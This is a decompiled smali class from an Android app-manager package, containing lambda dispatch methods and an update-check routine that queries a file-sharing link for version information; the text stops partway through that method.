.class public final synthetic Lua/t6;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/owen/tvrecyclerview/widget/TvRecyclerView$OnInBorderKeyEventListener;
.implements Lec/d;
.implements Lte/l;
.implements Lwg/b;
.implements Lt7/d;
.implements Lu1/j;


# instance fields
.field public final synthetic a:I


# direct methods
.method public synthetic constructor <init>(I)V
    .locals 0

    .line 1
    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(IILz1/a;Z)V
    .locals 0

    .line 2
    const/16 p1, 0xf

    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;II)V
    .locals 0

    .line 3
    iput p3, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;IJ)V
    .locals 0

    .line 4
    const/16 p1, 0xe

    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;JI)V
    .locals 0

    .line 5
    const/16 p1, 0x11

    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;Ljava/lang/Object;I)V
    .locals 0

    .line 6
    iput p3, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;Ljava/lang/Object;Ljava/lang/Object;I)V
    .locals 0

    .line 7
    iput p4, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;Ljava/lang/String;JJ)V
    .locals 0

    .line 8
    const/16 p1, 0x18

    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lz1/a;Z)V
    .locals 0

    .line 9
    const/16 p1, 0x1d

    iput p1, p0, Lua/t6;->a:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    iget v0, p0, Lua/t6;->a:I

    packed-switch v0, :pswitch_data_0

    check-cast p1, Ldb/y;

    .line 1
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const/4 p1, 0x0

    .line 2
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1

    .line 3
    :pswitch_0
    check-cast p1, Ldb/g;

    .line 4
    iget-boolean p1, p1, Ldb/g;->c:Z

    xor-int/lit8 p1, p1, 0x1

    .line 5
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    return-object p1

    .line 6
    :pswitch_1
    invoke-static {p1}, Lg/b;->t(Ljava/lang/Object;)V

    const/4 p1, 0x0

    throw p1

    :pswitch_data_0
    .packed-switch 0x7
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public a(Ljava/lang/Object;)V
    .locals 4

    iget v0, p0, Lua/t6;->a:I

    packed-switch v0, :pswitch_data_0

    check-cast p1, Lz1/b;

    .line 7
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 8
    :pswitch_0
    check-cast p1, Lz1/b;

    .line 9
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 10
    :pswitch_1
    check-cast p1, Lz1/b;

    .line 11
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 12
    :pswitch_2
    check-cast p1, Lz1/b;

    .line 13
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 14
    :pswitch_3
    check-cast p1, Lz1/b;

    .line 15
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 16
    :pswitch_4
    check-cast p1, Lz1/b;

    .line 17
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 18
    :pswitch_5
    check-cast p1, Lz1/b;

    .line 19
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 20
    :pswitch_6
    check-cast p1, Lz1/b;

    .line 21
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 22
    :pswitch_7
    check-cast p1, Lz1/b;

    .line 23
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 24
    :pswitch_8
    check-cast p1, Lz1/b;

    .line 25
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 26
    :pswitch_9
    check-cast p1, Lz1/b;

    .line 27
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 28
    :pswitch_a
    check-cast p1, Lz1/b;

    .line 29
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 30
    :pswitch_b
    check-cast p1, Lz1/b;

    .line 31
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 32
    :pswitch_c
    check-cast p1, Lz1/b;

    .line 33
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 34
    :pswitch_d
    check-cast p1, Lz1/b;

    .line 35
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 36
    :pswitch_e
    check-cast p1, Lz1/b;

    .line 37
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    return-void

    .line 38
    :pswitch_f
    check-cast p1, Lr1/k0;

    invoke-interface {p1}, Lr1/k0;->y()V

    return-void

    :pswitch_10
    check-cast p1, Lr1/k0;

    .line 39
    new-instance v0, Landroidx/fragment/app/b0;

    const/4 v1, 0x1

    invoke-direct {v0, v1}, Landroidx/fragment/app/b0;-><init>(I)V

    .line 40
    new-instance v1, Ly1/k;

    const/4 v2, 0x2

    const/16 v3, 0x3eb

    invoke-direct {v1, v2, v0, v3}, Ly1/k;-><init>(ILjava/lang/Exception;I)V

    .line 41
    invoke-interface {p1, v1}, Lr1/k0;->r(Ly1/k;)V

    return-void

    nop

    :pswitch_data_0
    .packed-switch 0xc
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public accept(Ljava/lang/Object;)V
    .locals 0

    .line 1
    check-cast p1, Ljava/io/IOException;

    .line 2
    .line 3
    throw p1
.end method

.method public apply(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 3

    .line 1
    iget v0, p0, Lua/t6;->a:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    new-instance v0, Lz1/e;

    .line 7
    .line 8
    check-cast p1, Lu1/z;

    .line 9
    .line 10
    invoke-direct {v0, p1}, Lz1/e;-><init>(Lu1/z;)V

    .line 11
    .line 12
    .line 13
    return-object v0

    .line 14
    :pswitch_0
    check-cast p1, Lx9/w3;

    .line 15
    .line 16
    :try_start_0
    invoke-static {}, Lcom/yunpan/appmanage/db/MyDb;->get()Lcom/yunpan/appmanage/db/MyDb;

    .line 17
    .line 18
    .line 19
    move-result-object v0

    .line 20
    invoke-virtual {v0}, Lcom/yunpan/appmanage/db/MyDb;->getFileInfoDao()Lcom/yunpan/appmanage/db/FileInfoDao;

    .line 21
    .line 22
    .line 23
    move-result-object v0

    .line 24
    new-instance v1, Ljava/lang/StringBuilder;

    .line 25
    .line 26
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 27
    .line 28
    .line 29
    iget-object v2, p1, Lx9/w3;->b:Ljava/lang/String;

    .line 30
    .line 31
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 32
    .line 33
    .line 34
    const-string v2, "/"

    .line 35
    .line 36
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 37
    .line 38
    .line 39
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    move-result-object v1

    .line 43
    invoke-interface {v0, v1}, Lcom/yunpan/appmanage/db/FileInfoDao;->getDirSize(Ljava/lang/String;)J

    .line 44
    .line 45
    .line 46
    move-result-wide v0

    .line 47
    iput-wide v0, p1, Lx9/w3;->d:J

    .line 48
    .line 49
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    .line 50
    .line 51
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 52
    .line 53
    .line 54
    :catch_0
    const-string v0, "item is null"

    .line 55
    .line 56
    invoke-static {p1, v0}, Ljc/a;->a(Ljava/lang/Object;Ljava/lang/String;)V

    .line 57
    .line 58
    .line 59
    new-instance v0, Lmc/k;

    .line 60
    .line 61
    invoke-direct {v0, p1}, Lmc/k;-><init>(Ljava/lang/Object;)V

    .line 62
    .line 63
    .line 64
    return-object v0

    .line 65
    :pswitch_data_0
    .packed-switch 0x6
        :pswitch_0
    .end packed-switch
.end method

.method public g(Lmc/b;)V
    .locals 12

    .line 1
    const-string v0, "jni\u670d\u52a1\u672a\u6fc0\u6d3b"

    .line 2
    .line 3
    iget v1, p0, Lua/t6;->a:I

    .line 4
    .line 5
    packed-switch v1, :pswitch_data_0

    .line 6
    .line 7
    .line 8
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 9
    .line 10
    const/16 v1, 0x13

    .line 11
    .line 12
    const-string v2, "x86"

    .line 13
    .line 14
    const-string v3, ""

    .line 15
    .line 16
    const/4 v4, 0x1

    .line 17
    const/4 v5, 0x0

    .line 18
    if-lt v0, v1, :cond_0

    .line 19
    .line 20
    sget-object v0, Lcom/yunpan/appmanage/util/k;->u0:Ljava/text/DecimalFormat;

    .line 21
    .line 22
    sget-object v0, Lcom/yunpan/appmanage/util/j;->a:Lcom/yunpan/appmanage/util/k;

    .line 23
    .line 24
    iget-object v0, v0, Lcom/yunpan/appmanage/util/k;->a:Landroid/content/ContextWrapper;

    .line 25
    .line 26
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    .line 27
    .line 28
    .line 29
    move-result-object v0

    .line 30
    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->nativeLibraryDir:Ljava/lang/String;

    .line 31
    .line 32
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 33
    .line 34
    .line 35
    move-result v0

    .line 36
    goto :goto_0

    .line 37
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    .line 38
    .line 39
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 40
    .line 41
    .line 42
    sget-object v1, Landroid/os/Build;->CPU_ABI:Ljava/lang/String;

    .line 43
    .line 44
    invoke-static {v1, v3, v0}, Lg/b;->l(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;)Ljava/lang/String;

    .line 45
    .line 46
    .line 47
    move-result-object v0

    .line 48
    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 49
    .line 50
    .line 51
    move-result v1

    .line 52
    if-eqz v1, :cond_1

    .line 53
    .line 54
    const-string v1, "v"

    .line 55
    .line 56
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 57
    .line 58
    .line 59
    move-result v0

    .line 60
    if-nez v0, :cond_1

    .line 61
    .line 62
    const/4 v0, 0x1

    .line 63
    goto :goto_0

    .line 64
    :cond_1
    const/4 v0, 0x0

    .line 65
    :goto_0
    :try_start_0
    sget-object v1, Lcom/yunpan/appmanage/util/k;->u0:Ljava/text/DecimalFormat;

    .line 66
    .line 67
    sget-object v1, Lcom/yunpan/appmanage/util/j;->a:Lcom/yunpan/appmanage/util/k;

    .line 68
    .line 69
    iget-object v2, v1, Lcom/yunpan/appmanage/util/k;->a:Landroid/content/ContextWrapper;

    .line 70
    .line 71
    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 72
    .line 73
    .line 74
    move-result-object v2

    .line 75
    new-instance v6, Landroid/content/ComponentName;

    .line 76
    .line 77
    iget-object v1, v1, Lcom/yunpan/appmanage/util/k;->a:Landroid/content/ContextWrapper;

    .line 78
    .line 79
    const-class v7, Lcom/yunpan/appmanage/ui/ActivityHome;

    .line 80
    .line 81
    invoke-direct {v6, v1, v7}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .line 83
    .line 84
    const/16 v1, 0x80

    .line 85
    .line 86
    invoke-virtual {v2, v6, v1}, Landroid/content/pm/PackageManager;->getActivityInfo(Landroid/content/ComponentName;I)Landroid/content/pm/ActivityInfo;

    .line 87
    .line 88
    .line 89
    move-result-object v1

    .line 90
    iget v1, v1, Landroid/content/pm/ActivityInfo;->screenOrientation:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 91
    .line 92
    if-ne v1, v4, :cond_2

    .line 93
    .line 94
    const/4 v1, 0x1

    .line 95
    goto :goto_1

    .line 96
    :catch_0
    nop

    .line 97
    :cond_2
    const/4 v1, 0x0

    .line 98
    :goto_1
    invoke-static {}, Ld/b;->H()Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    move-result-object v2

    .line 102
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    .line 103
    .line 104
    .line 105
    move-result v6

    .line 106
    if-eqz v6, :cond_3

    .line 107
    .line 108
    const-string v0, "\u672a\u83b7\u53d6\u5230\u7b7e\u540d\u4fe1\u606f"

    .line 109
    .line 110
    invoke-static {v0, p1}, Landroid/support/v4/media/session/a;->B(Ljava/lang/String;Lmc/b;)V

    .line 111
    .line 112
    .line 113
    goto/16 :goto_6

    .line 114
    .line 115
    :cond_3
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    .line 116
    .line 117
    .line 118
    move-result v6

    .line 119
    add-int/lit8 v6, v6, -0x6

    .line 120
    .line 121
    invoke-virtual {v2, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 122
    .line 123
    .line 124
    move-result-object v2

    .line 125
    sget-object v6, Lcom/yunpan/appmanage/util/k;->u0:Ljava/text/DecimalFormat;

    .line 126
    .line 127
    sget-object v6, Lcom/yunpan/appmanage/util/j;->a:Lcom/yunpan/appmanage/util/k;

    .line 128
    .line 129
    iget-boolean v7, v6, Lcom/yunpan/appmanage/util/k;->k:Z

    .line 130
    .line 131
    if-eqz v7, :cond_4

    .line 132
    .line 133
    const-string v7, "-uid"

    .line 134
    .line 135
    invoke-static {v2, v7}, Lg/b;->j(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 136
    .line 137
    .line 138
    move-result-object v2

    .line 139
    :cond_4
    if-eqz v1, :cond_5

    .line 140
    .line 141
    const-string v0, "-portrait"

    .line 142
    .line 143
    :goto_2
    invoke-static {v2, v0}, Lg/b;->j(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v2

    .line 147
    goto :goto_3

    .line 148
    :cond_5
    if-eqz v0, :cond_6

    .line 149
    .line 150
    const-string v0, "-x86"

    .line 151
    .line 152
    goto :goto_2

    .line 153
    :cond_6
    :goto_3
    const-string v0, ".apk"

    .line 154
    .line 155
    invoke-static {v2, v0}, Lg/b;->j(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v1

    .line 159
    iget-object v2, v6, Lcom/yunpan/appmanage/util/k;->d:Ljava/lang/String;

    .line 160
    .line 161
    const-string v7, "com.yunpan.appmanage"

    .line 162
    .line 163
    invoke-virtual {v2, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 164
    .line 165
    .line 166
    move-result v2

    .line 167
    if-nez v2, :cond_7

    .line 168
    .line 169
    new-instance v1, Ljava/lang/StringBuilder;

    .line 170
    .line 171
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 172
    .line 173
    .line 174
    iget-object v2, v6, Lcom/yunpan/appmanage/util/k;->d:Ljava/lang/String;

    .line 175
    .line 176
    invoke-static {v2, v0, v1}, Lg/b;->l(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;)Ljava/lang/String;

    .line 177
    .line 178
    .line 179
    move-result-object v1

    .line 180
    :cond_7
    const-string v0, "https://share.feijipan.com/s/sVVQAreh"

    .line 181
    .line 182
    const-string v2, "_"

    .line 183
    .line 184
    const-string v6, "?"

    .line 185
    .line 186
    const-string v7, "#"

    .line 187
    .line 188
    const-string v8, "."

    .line 189
    .line 190
    new-instance v9, Lba/o;

    .line 191
    .line 192
    invoke-direct {v9}, Lba/o;-><init>()V

    .line 193
    .line 194
    .line 195
    :try_start_1
    new-instance v10, Lba/r;

    .line 196
    .line 197
    const-string v11, "share"

    .line 198
    .line 199
    invoke-direct {v10, v11, v0, v3}, Lba/r;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 200
    .line 201
    .line 202
    iput-object v3, v10, Lba/r;->m:Ljava/lang/String;

    .line 203
    .line 204
    iput v4, v10, Lba/r;->n:I

    .line 205
    .line 206
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    .line 207
    .line 208
    .line 209
    move-result-object v3

    .line 210
    invoke-virtual {v3}, Ljava/util/UUID;->toString()Ljava/lang/String;

    .line 211
    .line 212
    .line 213
    move-result-object v3

    .line 214
    iput-object v3, v10, Lba/r;->g:Ljava/lang/String;

    .line 215
    .line 216
    iget-object v3, v10, Lba/r;->c:Ljava/lang/String;

    .line 217
    .line 218
    const-string v11, "/"

    .line 219
    .line 220
    invoke-virtual {v3, v11}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    .line 221
    .line 222
    .line 223
    move-result v11

    .line 224
    add-int/2addr v11, v4

    .line 225
    invoke-virtual {v3, v11}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    .line 226
    .line 227
    .line 228
    move-result-object v3

    .line 229
    invoke-virtual {v3, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 230
    .line 231
    .line 232
    move-result v11

    .line 233
    if-eqz v11, :cond_8

    .line 234
    .line 235
    invoke-virtual {v3, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 236
    .line 237
    .line 238
    move-result v8

    .line 239
    invoke-virtual {v3, v5, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 240
    .line 241
    .line 242
    move-result-object v3

    .line 243
    :cond_8
    invoke-virtual {v3, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 244
    .line 245
    .line 246
    move-result v8

    .line 247
    if-eqz v8, :cond_9

    .line 248
    .line 249
    invoke-virtual {v3, v7}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 250
    .line 251
    .line 252
    move-result v7

    .line 253
    invoke-virtual {v3, v5, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 254
    .line 255
    .line 256
    move-result-object v3

    .line 257
    :cond_9
    invoke-virtual {v3, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 258
    .line 259
    .line 260
    move-result v7

    .line 261
    if-eqz v7, :cond_a

    .line 262
    .line 263
    invoke-virtual {v3, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 264
    .line 265
    .line 266
    move-result v6

    .line 267
    invoke-virtual {v3, v5, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 268
    .line 269
    .line 270
    move-result-object v3

    .line 271
    :cond_a
    iput-object v3, v10, Lba/r;->f:Ljava/lang/String;

    .line 272
    .line 273
    invoke-static {v10}, Ls1/g;->C(Lba/r;)Ljava/lang/String;

    .line 274
    .line 275
    .line 276
    move-result-object v3

    .line 277
    invoke-static {v3}, Ld/b;->b0(Ljava/lang/String;)Lz7/p;

    .line 278
    .line 279
    .line 280
    move-result-object v3

    .line 281
    invoke-virtual {v3}, Lz7/p;->g()Lz7/s;

    .line 282
    .line 283
    .line 284
    move-result-object v3

    .line 285
    const-string v6, "code"

    .line 286
    .line 287
    invoke-virtual {v3, v6}, Lz7/s;->o(Ljava/lang/String;)Lz7/p;

    .line 288
    .line 289
    .line 290
    move-result-object v6

    .line 291
    invoke-virtual {v6}, Lz7/p;->e()I

    .line 292
    .line 293
    .line 294
    move-result v6

    .line 295
    const/16 v7, 0xc8

    .line 296
    .line 297
    if-ne v6, v7, :cond_c

    .line 298
    .line 299
    const-string v6, "list"

    .line 300
    .line 301
    invoke-virtual {v3, v6}, Lz7/s;->p(Ljava/lang/String;)Lz7/o;

    .line 302
    .line 303
    .line 304
    move-result-object v3

    .line 305
    invoke-virtual {v3, v5}, Lz7/o;->l(I)Lz7/p;

    .line 306
    .line 307
    .line 308
    move-result-object v3

    .line 309
    invoke-virtual {v3}, Lz7/p;->g()Lz7/s;

    .line 310
    .line 311
    .line 312
    move-result-object v3

    .line 313
    const-string v6, "folderIds"

    .line 314
    .line 315
    invoke-virtual {v3, v6}, Lz7/s;->o(Ljava/lang/String;)Lz7/p;

    .line 316
    .line 317
    .line 318
    move-result-object v6

    .line 319
    invoke-virtual {v6}, Lz7/p;->i()Ljava/lang/String;

    .line 320
    .line 321
    .line 322
    move-result-object v6

    .line 323
    iput-object v6, v10, Lba/r;->m:Ljava/lang/String;

    .line 324
    .line 325
    const-string v6, "fileList"

    .line 326
    .line 327
    invoke-virtual {v3, v6}, Lz7/s;->p(Ljava/lang/String;)Lz7/o;

    .line 328
    .line 329
    .line 330
    move-result-object v3

    .line 331
    invoke-virtual {v3, v5}, Lz7/o;->l(I)Lz7/p;

    .line 332
    .line 333
    .line 334
    move-result-object v3

    .line 335
    invoke-virtual {v3}, Lz7/p;->g()Lz7/s;

    .line 336
    .line 337
    .line 338
    move-result-object v3

    .line 339
    const-string v6, "folderDesc"

    .line 340
    .line 341
    invoke-virtual {v3, v6}, Lz7/s;->o(Ljava/lang/String;)Lz7/p;

    .line 342
    .line 343
    .line 344
    move-result-object v3

    .line 345
    invoke-virtual {v3}, Lz7/p;->i()Ljava/lang/String;

    .line 346
    .line 347
    .line 348
    move-result-object v3

    .line 349
    invoke-virtual {v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 350
    .line 351
    .line 352
    move-result v6

    .line 353
    invoke-virtual {v3, v5, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 354
    .line 355
    .line 356
    move-result-object v5

    .line 357
    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    .line 358
    .line 359
    .line 360
    move-result-object v5

    .line 361
    iput-object v5, v9, Lba/o;->d:Ljava/lang/String;

    .line 362
    .line 363
    invoke-virtual {v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 364
    .line 365
    .line 366
    move-result v2

    .line 367
    add-int/2addr v2, v4

    .line 368
    const-string v4, "\n"

    .line 369
    .line 370
    invoke-virtual {v3, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    .line 371
    .line 372
    .line 373
    move-result v4

    .line 374
    invoke-virtual {v3, v2, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    .line 375
    .line 376
    .line 377
    move-result-object v2

    .line 378
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    .line 379
    .line 380
    .line 381
    move-result-object v2

    .line 382
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    .line 383
    .line 384
    .line 385
    move-result-object v2

    .line 386
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    .line 387
    .line 388
    .line 389
    move-result v2

    .line 390
    iput v2, v9, Lba/o;->c:I

    .line 391
    .line 392
    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    .line 393
    .line 394
    .line 395
    move-result-object v2

    .line 396
    iput-object v2, v9, Lba/o;->e:Ljava/lang/String;

    .line 397
    .line 398
    iget-object v2, v10, Lba/r;->g:Ljava/lang/String;

    .line 399
    .line 400
    iput-object v2, v9, Lba/o;->h:Ljava/lang/String;

    .line 401
    .line 402
    iget-object v2, v10, Lba/r;->f:Ljava/lang/String;

    .line 403
    .line 404
    iput-object v2, v9, Lba/o;->g:Ljava/lang/String;

    .line 405
    .line 406
    iput-object v0, v9, Lba/o;->f:Ljava/lang/String;

    .line 407
    .line 408
    invoke-static {v10}, Ls1/g;->y(Lba/r;)Ljava/util/ArrayList;

    .line 409
    .line 410
    .line 411
    move-result-object v0

    .line 412
    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    .line 413
    .line 414
    .line 415
    move-result-object v0

    .line 416
    :cond_b
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 417
    .line 418
    .line 419
    move-result v2

    .line 420
    if-eqz v2, :cond_d

    .line 421
    .line 422
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 423
    .line 424
    .line 425
    move-result-object v2

    .line 426
    check-cast v2, Lx9/b6;

    .line 427
    .line 428
    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;

    .line 429
    .line 430
    iget-object v2, v2, Lx9/b6;->e:Lba/s;

    .line 431
    .line 432
    iget-object v4, v2, Lba/s;->i:Ljava/io/Serializable;

    .line 433
    .line 434
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 435
    .line 436
    .line 437
    iget-object v3, v2, Lba/s;->i:Ljava/io/Serializable;

    .line 438
    .line 439
    check-cast v3, Ljava/lang/String;

    .line 440
    .line 441
    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 442
    .line 443
    .line 444
    move-result v3

    .line 445
    if-eqz v3, :cond_b

    .line 446
    .line 447
    iget-wide v0, v2, Lba/s;->d:J

    .line 448
    .line 449
    iput-wide v0, v9, Lba/o;->i:J

    .line 450
    .line 451
    iget v0, v2, Lba/s;->e:I

    .line 452
    .line 453
    int-to-long v0, v0

    .line 454
    iput-wide v0, v9, Lba/o;->j:J

    .line 455
    .line 456
    goto :goto_4

    .line 457
    :catch_1
    nop

    .line 458
    goto :goto_4

    .line 459
    :cond_c
    new-instance v0, Ljava/lang/Exception;

    .line 460
    .line 461
    const-string v1, "msg"

    .line 462
    .line 463
    invoke-virtual {v3, v1}, Lz7/s;->o(Ljava/lang/String;)Lz7/p;

    .line 464
    .line 465
    .line 466
    move-result-object v1

    .line 467
    invoke-virtual {v1}, Lz7/p;->i()Ljava/lang/String;

    .line 468
    .line 469
    .line 470
    move-result-object v1

    .line 471
    invoke-direct {v0, v1}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    .line 472
    .line 473
    .line 474
    throw v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 475
    :cond_d
    :goto_4
    iget v0, v9, Lba/o;->c:I

    .line 476
    .line 477
    iget-object v1, v9, Lba/o;->e:Ljava/lang/String;

    .line 478
    .line 479
    if-eqz v0, :cond_10

    .line 480
    .line 481
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    .line 482
    .line 483
    .line 484
    move-result v0

    .line 485
    if-nez v0, :cond_10

    .line 486
    .line 487
    iget-wide v0, v9, Lba/o;->i:J

    .line 488
    .line 489
    const-wide/16 v2, 0x0

    .line 490
    .line 491
    cmp-long v4, v0, v2

    .line 492
    .line 493
    if-nez v4, :cond_e

    .line 494
    .line 495
    goto :goto_5

    .line 496
    :cond_e
    sget-object v0, Lcom/yunpan/appmanage/util/v;->a:Lcom/yunpan/appmanage/util/w;

    .line 497
    .line 498
    iget v1, v0, Lcom/yunpan/appmanage/util/w;->d:I

    .line 499
    .line 500
    iget v2, v9, Lba/o;->c:I

    .line 501
    .line 502
    if-lt v1, v2, :cond_f

    .line 503
    .line 504
    const-string v0, "\u6ca1\u6709\u53d1\u73b0\u65b0\u7248\u672c"

    .line 505
    .line 506
    invoke-static {v0}, Lcom/hjq/toast/Toaster;->show(Ljava/lang/CharSequence;)V

    .line 507
    .line 508
    .line 509
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 510
    .line 511
    .line 512
    goto :goto_6

    .line 513
    :cond_f
    iget-object v0, v0, Lcom/yunpan/appmanage/util/w;->c:Ljava/lang/String;

    .line 514
    .line 515
    iput-object v0, v9, Lba/o;->b:Ljava/lang/String;

    .line 516
    .line 517
    iput v1, v9, Lba/o;->a:I

    .line 518
    .line 519
    invoke-virtual {p1, v9}, Lmc/b;->f(Ljava/lang/Object;)V

    .line 520
